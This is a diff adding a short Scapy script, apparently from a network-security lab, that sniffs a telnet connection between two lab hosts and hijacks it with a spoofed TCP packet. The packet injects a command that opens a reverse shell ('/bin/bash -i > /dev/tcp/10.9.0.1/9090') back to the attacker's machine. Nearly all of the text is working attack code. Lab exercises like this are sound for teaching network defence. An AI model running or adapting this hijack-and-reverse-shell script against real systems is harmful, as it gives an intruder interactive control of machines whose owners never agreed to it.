@@ -1,0 +1,35 @@
+from scapy.all import IP, TCP, send, sniff
+import time
+
+H1_IP = '10.9.0.6'
+V_IP = '10.9.0.5'
+
+def printPkt(pkt):
+  src = pkt[IP].src
+  dst = pkt[IP].dst
+  sport = pkt[TCP].sport
+  dport = pkt[TCP].dport
+  fl = pkt[TCP].flags
+  wd = pkt[TCP].window
+  seq = pkt[TCP].seq
+  ack = pkt[TCP].ack
+  if(pkt[TCP].payload):
+    data = pkt[TCP].payload.load
+  else: data = ''
+  # window length is 64128 for the lab
+  print("%s:%d, %s:%d. %s."%(src, sport, dst, dport, fl))
+  print("seq=%d, ack=%d. len=%d, data=%s"%(seq, ack, len(data), data))
+
+def hijack(pkt):
+  printPkt(pkt)
+  ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
+  tcp = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags='A', \
+    seq=pkt[TCP].ack+1, ack=pkt[TCP].seq)
+  # data = '\n echo "top security" > security.txt \n'
+  data = '\n /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1 \n'
+  npkt = ip/tcp/data
+  send(npkt, verbose=1)
+  exit()
+
+f0 = 'tcp and src host ' + V_IP + ' and src port 23 and dst host ' + H1_IP
+sniff(iface='br-75f8e3d470c7', filter=f0, prn=hijack)
